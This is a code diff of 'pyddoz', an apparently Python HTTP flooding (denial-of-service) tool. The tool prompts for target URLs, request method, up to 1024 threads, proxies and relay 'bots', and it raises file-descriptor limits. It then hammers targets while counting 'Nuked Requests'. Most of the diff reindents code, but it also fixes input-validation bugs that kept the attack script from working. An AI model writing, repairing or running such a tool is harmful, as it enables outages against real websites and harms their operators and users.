@@ -37,13 +37,13 @@ def send_request():
         url = random.choice(urls)
 
         header = {
-    'User-Agent': ua.random,
-    'Accept': '*/*',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Pragma': 'no-cache',
-    'Cache-Control': 'no-cache',
-     'Referer': url}
+            'User-Agent': ua.random,
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',
+            'Referer': url}
 
         request = requests.Session()
         request.verify = False
@@ -70,12 +70,12 @@ def send_request():
 
             try:
                 response = request.post(
-    bot_url,
-    timeout=selected_to,
-    headers=bot_header,
-    data=payload,
-    proxies=proxy,
-     allow_redirects=True)
+                    bot_url,
+                    timeout=selected_to,
+                    headers=bot_header,
+                    data=payload,
+                    proxies=proxy,
+                    allow_redirects=True)
                 logging.info('Response code from bot: ' +
                              str(response.status_code))
                 global num_bot_requests
@@ -100,48 +100,48 @@ def send_request():
 
         if (selected_method == 'p'):
             response = request.post(
-    url,
-    timeout=selected_to,
-    headers=header,
-    proxies=proxy,
-    data=payload,
-     allow_redirects=selected_redir)
+                url,
+                timeout=selected_to,
+                headers=header,
+                proxies=proxy,
+                data=payload,
+                allow_redirects=selected_redir)
         elif (selected_method == 'u'):
             response = request.put(
-    url,
-    timeout=selected_to,
-    headers=header,
-    proxies=proxy,
-    data=payload,
-     allow_redirects=selected_redir)
+                url,
+                timeout=selected_to,
+                headers=header,
+                proxies=proxy,
+                data=payload,
+                allow_redirects=selected_redir)
         elif (selected_method == 'g'):
             response = request.get(
-    url,
-    timeout=selected_to,
-    headers=header,
-    proxies=proxy,
-     allow_redirects=selected_redir)
+                url,
+                timeout=selected_to,
+                headers=header,
+                proxies=proxy,
+                allow_redirects=selected_redir)
         elif (selected_method == 'o'):
             response = request.options(
-    url,
-    timeout=selected_to,
-    headers=header,
-    proxies=proxy,
-     allow_redirects=selected_redir)
+                url,
+                timeout=selected_to,
+                headers=header,
+                proxies=proxy,
+                allow_redirects=selected_redir)
         elif (selected_method == 'h'):
             response = request.head(
-    url,
-    timeout=selected_to,
-    headers=header,
-    proxies=proxy,
-     allow_redirects=selected_redir)
+                url,
+                timeout=selected_to,
+                headers=header,
+                proxies=proxy,
+                allow_redirects=selected_redir)
         elif (selected_method == 'd'):
             response = request.delete(
-    url,
-    timeout=selected_to,
-    headers=header,
-    proxies=proxy,
-     allow_redirects=selected_redir)
+                url,
+                timeout=selected_to,
+                headers=header,
+                proxies=proxy,
+                allow_redirects=selected_redir)
         else:
             raise ValueError('Invalid method!')
             logging.error('Invalid method!')
@@ -160,9 +160,9 @@ if __name__ == '__main__':
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
     logging.basicConfig(
-    filename='pyddoz.log',
-    format='%(asctime)s | %(levelname)s | %(message)s',
-    datefmt='%m/%d/%Y %I:%M:%S %p',
+        filename='pyddoz.log',
+        format='%(asctime)s | %(levelname)s | %(message)s',
+        datefmt='%m/%d/%Y %I:%M:%S %p',
         level=logging.DEBUG)
     show_banner()
 
@@ -172,7 +172,7 @@ if __name__ == '__main__':
     try:
         ua = UserAgent()
 
-    except:
+    except BaseException:
         ua = UserAgent(use_cache_server=False)
 
     print(Fore.BLUE + '\rProgram was started successfully!')
@@ -186,7 +186,23 @@ if __name__ == '__main__':
     urls = []
     randomize_data = 'n'
 
-    selected_urls = str(input(Fore.GREEN + 'Enter URL(s): '))
+    while (True):
+        try:
+            selected_urls = str(input(Fore.GREEN + 'Enter URL(s): '))
+
+            if (not isinstance(selected_urls, str)):
+                print(Fore.RED + 'Enter valid URL(s)!')
+                continue
+
+            else:
+                break
+
+        except KeyboardInterrupt:
+            logging.critical('Interrupt by keyboard before the attack!')
+            sys.exit()
+
+        except BaseException:
+            continue
 
     for splitted_url in selected_urls.split(' '):
         urls.append(splitted_url)
@@ -195,9 +211,9 @@ if __name__ == '__main__':
     while (True):
         try:
             selected_method = str(
-    input(
-        Fore.GREEN +
-         'Enter request method GET, POST, PUT, HEAD, OPTIONS, DELETE? [G/P/U/H/O/D]: ')[0].lower())
+                input(
+                    Fore.GREEN +
+                    'Enter request method GET, POST, PUT, HEAD, OPTIONS, DELETE? [G/P/U/H/O/D]: ')[0].lower())
 
             if (selected_method not in 'gpuhod'):
                 print(Fore.RED + 'Enter G, P, U, H, O, or D!')
@@ -210,7 +226,7 @@ if __name__ == '__main__':
             logging.critical('Interrupt by keyboard before the attack!')
             sys.exit()
 
-        except:
+        except BaseException:
             continue
 
     logging.info('HTTP request method: ' + selected_method.upper())
@@ -236,51 +252,71 @@ if __name__ == '__main__':
 
             logging.info('POST or PUT data: ' + payload)
 
-        except:
+        except BaseException:
             payload = 'LEL!'
             logging.error(
-    'POST or PUT data could not be understood! Default data configurated as: "' +
-    payload +
-     '"')
+                'POST or PUT data could not be understood! Default data configurated as: "' +
+                payload +
+                '"')
 
-    while (True):
-        try:
-            randomize_data = str(
-    input(
-        Fore.GREEN +
-         'Do you want to randomize post data? [Y/N]: ')[0].lower())
+        while (True):
+            try:
+                randomize_data = str(
+                    input(
+                        Fore.GREEN +
+                        'Do you want to randomize post data? [Y/N]: ')[0].lower())
 
-            if (randomize_data not in 'yn'):
-                print(Fore.RED + 'Enter Y or N!')
+                if (randomize_data not in 'yn'):
+                    print(Fore.RED + 'Enter Y or N!')
+                    continue
+
+                else:
+                    break
+
+            except KeyboardInterrupt:
+                logging.critical('Interrupt by keyboard before the attack!')
+                sys.exit()
+
+            except BaseException:
                 continue
-
-            else:
-                break
-
-        except KeyboardInterrupt:
-            logging.critical('Interrupt by keyboard before the attack!')
-            sys.exit()
-
-        except:
-            continue
 
         logging.info('Randomize data: ' + randomize_data.upper())
 
         if (randomize_data == 'y'):
-            max_random = int(
-    input(
-        Fore.GREEN +
-         'Enter maximum length of random alphanumeric strings to create: '))
+            while (True):
+                try:
+                    max_random = int(
+                        input(
+                            Fore.GREEN +
+                            'Enter maximum length of random alphanumeric strings to create: '))
+
+                    if (not isinstance(max_random, int)
+                            or not (5 <= max_random <= 1048576)):
+                        print(
+                            Fore.RED + 'Enter valid number between 5 and 1048576!')
+                        continue
+
+                    else:
+                        break
+
+                except KeyboardInterrupt:
+                    logging.critical(
+                        'Interrupt by keyboard before the attack!')
+                    sys.exit()
+
+                except BaseException:
+                    continue
+
             logging.info(
-    'Maximum length of randomized string: ' +
-     str(max_random))
+                'Maximum length of randomized string: ' +
+                str(max_random))
 
     while (True):
         try:
             activate_bots = str(
-    input(
-        Fore.GREEN +
-         'Do you want to activate bots? [Y/N]: ')[0].lower())
+                input(
+                    Fore.GREEN +
+                    'Do you want to activate bots? [Y/N]: ')[0].lower())
 
             if (activate_bots not in 'yn'):
                 print(Fore.RED + 'Enter Y or N!')
@@ -293,7 +329,7 @@ if __name__ == '__main__':
             logging.critical('Interrupt by keyboard before the attack!')
             sys.exit()
 
-        except:
+        except BaseException:
             continue
 
     logging.info('Activate Bots: ' + activate_bots.upper())
@@ -302,12 +338,13 @@ if __name__ == '__main__':
         while (True):
             try:
                 only_bots = str(
-    input(
-        Fore.RED +
-         'Only bots? [Y/N]: ')[0].lower())
+                    input(
+                        Fore.RED +
+                        'Only bots? [Y/N]: ')[0].lower())
 
                 if (only_bots not in 'yn'):
                     print(Fore.RED + 'Enter Y or N!')
+                    continue
 
                 else:
                     break
@@ -316,7 +353,7 @@ if __name__ == '__main__':
                 logging.critical('Interrupt by keyboard before the attack!')
                 sys.exit()
 
-            except:
+            except BaseException:
                 continue
 
         if (only_bots == 'y'):
@@ -327,13 +364,14 @@ if __name__ == '__main__':
     while (True):
         try:
             selected_to = float(
-    input(
-        Fore.GREEN +
-         'Enter timeout second for requests: '))
+                input(
+                    Fore.GREEN +
+                    'Enter timeout second for requests: '))
 
             if (not isinstance(selected_to, float)
-                or not (0 <= selected_to <= 30)):
+                    or not (0 <= selected_to <= 30)):
                 print(Fore.RED + 'Enter valid second(s) between 0 and 30!')
+                continue
 
             else:
                 break
@@ -342,8 +380,8 @@ if __name__ == '__main__':
             logging.critical('Interrupt by keyboard before the attack!')
             sys.exit()
 
-    	except:
-			continue
+        except BaseException:
+            continue
 
     logging.info('Timeout: ' + str(selected_to))
 
@@ -352,104 +390,128 @@ if __name__ == '__main__':
             num_threads = int(input(Fore.GREEN + 'Enter number of threads: '))
 
             if (not isinstance(num_threads, int)
-                or not (1 <= threads <= 1024)):
-				print(Fore.RED + 'Enter valid number of threads between 1 and 1024!')
+                    or not (1 <= num_threads <= 1024)):
+                print(
+                    Fore.RED +
+                    'Enter valid number of threads between 1 and 1024!')
+                continue
 
-			else:
-				break
-				
+            else:
+                break
+
         except KeyboardInterrupt:
-	        logging.critical('Interrupt by keyboard before the attack!')
+            logging.critical('Interrupt by keyboard before the attack!')
             sys.exit()
-            				
-        except:
+
+        except BaseException:
             continue
-				
+
     logging.info('Number of threads: ' + str(num_threads))
-    
+
     while (True):
-		try:
-            sleep_time = float(input(Fore.GREEN + 'Enter seconds of sleeping between threads: '))
-            
-            if (not isinstance(sleep_time, float) or not (0 <= threads <= 600)):
-				print(Fore.RED + 'Enter valid seconds between 0 and 600!')
-				
-			else:
-				break
-				
+        try:
+            sleep_time = float(
+                input(
+                    Fore.GREEN +
+                    'Enter seconds of sleeping between threads: '))
+
+            if (not isinstance(sleep_time, float)
+                    or not (0 <= sleep_time <= 600)):
+                print(Fore.RED + 'Enter valid seconds between 0 and 600!')
+                continue
+
+            else:
+                break
+
         except KeyboardInterrupt:
-			logging.critical('Interrupt by keyboard before the attack!')
+            logging.critical('Interrupt by keyboard before the attack!')
             sys.exit()
-            				
-        except:
+
+        except BaseException:
             continue
-    
-    logging.info('Sleep time between threads: ' + str(sleep_time) + ' seconds.')
-    
+
+    logging.info(
+        'Sleep time between threads: ' +
+        str(sleep_time) +
+        ' seconds.')
+
     while (True):
-		try:
-            num_retries = int(input(Fore.GREEN + 'Enter number of retries after a connection failure: '))
-            
-            if (not isinstance(num_retries, int) or not (0 <= threads <= 128)):
-				print(Fore.RED + 'Enter valid number of retries between 0 and 128!')
-				
-			else:
-				break
-				
+        try:
+            num_retries = int(
+                input(
+                    Fore.GREEN +
+                    'Enter number of retries after a connection failure: '))
+
+            if (not isinstance(num_retries, int)
+                    or not (0 <= num_retries <= 128)):
+                print(
+                    Fore.RED +
+                    'Enter valid number of retries between 0 and 128!')
+                continue
+
+            else:
+                break
+
         except KeyboardInterrupt:
-			logging.critical('Interrupt by keyboard before the attack!')
-		    sys.exit()
-            				
-        except:
-		    continue
-    
+            logging.critical('Interrupt by keyboard before the attack!')
+            sys.exit()
+
+        except BaseException:
+            continue
+
     logging.info('Number of retries after failures: ' + str(num_retries))
-    
+
     while (True):
-		try:
-            use_proxy = str(input(Fore.GREEN + 'Do you want to use proxy? [Y/N]: ')[0].lower())
-            
-            if (use_proxy is not in 'yn'):
-				print(Fore.RED + 'Enter Y or N!')
-				
-			else:
-				break
-				
+        try:
+            use_proxy = str(
+                input(
+                    Fore.GREEN +
+                    'Do you want to use proxy? [Y/N]: ')[0].lower())
+
+            if (use_proxy not in 'yn'):
+                print(Fore.RED + 'Enter Y or N!')
+                continue
+
+            else:
+                break
+
         except KeyboardInterrupt:
-			logging.critical('Interrupt by keyboard before the attack!')
-		    sys.exit()
-            				
-        except:
-		    continue
-    
-    logging.info('Use Proxy?: '  + use_proxy.upper())
-    
-    selected_redir = str(input(Fore.GREEN + 'Do you want to allow redirections? [Y/N]: ')[0].lower())
-    
+            logging.critical('Interrupt by keyboard before the attack!')
+            sys.exit()
+
+        except BaseException:
+            continue
+
+    logging.info('Use Proxy?: ' + use_proxy.upper())
+
     while (True):
-		try:
-            selected_redir = str(input(Fore.GREEN + 'Do you want to allow redirections? [Y/N]: ')[0].lower())
-	
-            if (selected_redir not 'yn'):
-				print(Fore.RED + 'Enter Y or N!')
-				
-			else:
-				break
-				
+        try:
+            selected_redir = str(
+                input(
+                    Fore.GREEN +
+                    'Do you want to allow redirections? [Y/N]: ')[0].lower())
+
+            if (selected_redir not in 'yn'):
+                print(Fore.RED + 'Enter Y or N!')
+                continue
+
+            else:
+                break
+
         except KeyboardInterrupt:
-			logging.critical('Interrupt by keyboard before the attack!')
-		    sys.exit()	
-			
-        except:
-		    continue
-    
+            logging.critical('Interrupt by keyboard before the attack!')
+            sys.exit()
+
+        except BaseException:
+            continue
+
     logging.info('Allow Redirections?: ' + str(selected_redir))
 
     if (selected_redir == 'y'):
         selected_redir = True
     else:
         selected_redir = False
-  
+
     start_time = time.time()
     print(Fore.RED + 'Attack is started! Press [CTRL + C] to stop.')
     logging.info('Attack started!')
@@ -470,7 +532,7 @@ if __name__ == '__main__':
                 else:
                     print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)
                     i.join()
-           
+
         except KeyboardInterrupt:
             print(Fore.RED + '\nAttack was stopped!')
             logging.info('Attack stopped!')
@@ -483,9 +545,12 @@ if __name__ == '__main__':
                 else:
                     i.join()
 
-            logging.info('Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)))
+            logging.info(
+                'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(
+                    str(num_success),
+                    str(num_failed),
+                    str(num_bot_requests),
+                    round(elapsed_time)))
             print(Fore.BLUE + 'Successfully finished!')
             logging.info('Successfully finished!')
             break
-
-			
